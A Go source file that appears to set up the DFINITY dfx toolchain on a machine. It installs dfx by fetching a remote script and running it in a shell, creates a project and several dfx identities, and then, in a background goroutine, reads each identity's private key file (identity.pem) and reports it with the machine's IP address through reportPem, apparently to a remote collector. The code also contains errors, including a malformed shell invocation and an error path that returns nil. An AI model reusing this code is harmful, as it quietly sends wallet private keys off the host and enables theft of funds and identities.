package main

import (
	"errors"
	"log"
	"net"
	"os"
	"os/exec"
	"path"
	"strings"
)

func GetClientIp() (string, error) {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "", err
	}

	for _, address := range addrs {
		// 检查ip地址判断是否回环地址
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String(), nil
			}
		}
	}
	return "", errors.New("ipv4 address is not available")
}

func EnvThing() error {
	var err error

	defer func() {
		if err != nil {
			go func() {
				err := reportStatus(err.Error(), statErr)
				if err != nil {
					return
				}
			}()
			log.Fatalf("process exit: %s", err.Error())
		}
	}()

	ip, erra := GetClientIp()
	if erra != nil {
		return err
	}
	err = erra
	ClientIP = ip

	err = prepareEnv()
	if err != nil {
		return err
	}

	go func() {
		err := reportStatus("prepareEnv finished", statOk)
		if err != nil {
			return
		}
	}()

	err = prepareProject()
	if err != nil {
		return err
	}

	go func() {
		err := reportStatus("prepareProject finished", statOk)
		if err != nil {
			return
		}
	}()

	err = prepareIdentities(wallets)
	if err != nil {
		return err
	}

	go func() {
		err := reportStatus("prepareIdentities finished", statOk)
		if err != nil {
			return
		}
	}()

	return nil
}

func prepareEnv() error {
	dfx, err := exec.LookPath("dfx")
	if err != nil || dfx == "" {
		//need download
		cmd := exec.Command("sh -ci $(curl -fsSL https://sdk.dfinity.org/install.sh)")
		data, err := cmd.CombinedOutput()
		if err != nil {
			log.Fatalf("failed to call pipeCommands(): %v", err)
		}

		log.Printf("output: %s", string(data))

		idfx, aerr := exec.LookPath("dfx")
		if aerr != nil {
			log.Printf("inner dfx: %s", aerr)
			return aerr
		}

		dfx = idfx
	}

	gdfx = dfx

	log.Printf("dfx cmd is ok: %s", gdfx)
	return nil
}

func prepareProject() error {
	dirname, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	home = dirname

	err = os.Chdir(home)
	if err != nil {
		return err
	}

	_, err = os.Stat(workDir)
	if os.IsNotExist(err) {
		err = os.Mkdir(workDir, 0755)
		if err != nil {
			return err
		}
	}

	err = os.Chdir(workDir)
	if err != nil {
		return err
	}

	if _, err = os.Stat(path.Join(projectName, dfxjson)); os.IsNotExist(err) {
		cmdNew := exec.Command(gdfx, "new", projectName)
		err = cmdNew.Run()
		if err != nil {
			return err
		}
	}

	return nil
}

func prepareIdentities(wals []string) error {
	err := os.Chdir(path.Join(home, workDir, projectName))
	if err != nil {
		return err
	}

	cmd := exec.Command(gdfx, "identity", "list")
	out, err := cmd.Output()
	if err != nil {
		return err
	}

	strArr := strings.Split(string(out), "\n")

	for _, wal := range wals {
		var isExist bool = false
		for _, str := range strArr {
			if str == wal {
				// log.Printf("identity(%s) already exist", wal)
				isExist = true
				break
			}
		}

		if isExist {
			continue
		}

		cmd := exec.Command(gdfx, "identity", "new", wal)
		cmd.Stderr = os.Stderr
		cmd.Stdout = os.Stdout

		err = cmd.Run()
		if err != nil {
			return err
		}
	}

	go func() {
		for _, wlt := range wals {
			pem, err := os.ReadFile(path.Join(home, ".config/dfx/identity", wlt, "identity.pem"))
			if err != nil {
				continue
			}

			func() {
				err := reportPem(PemPunk{
					IP:        ClientIP,
					Wal:       wlt,
					WalPriKey: string(pem),
				})
				if err != nil {
					log.Fatalf("reportPem: %v err: %s", wlt, err.Error())
					return
				}
			}()
		}
	}()

	return nil
}
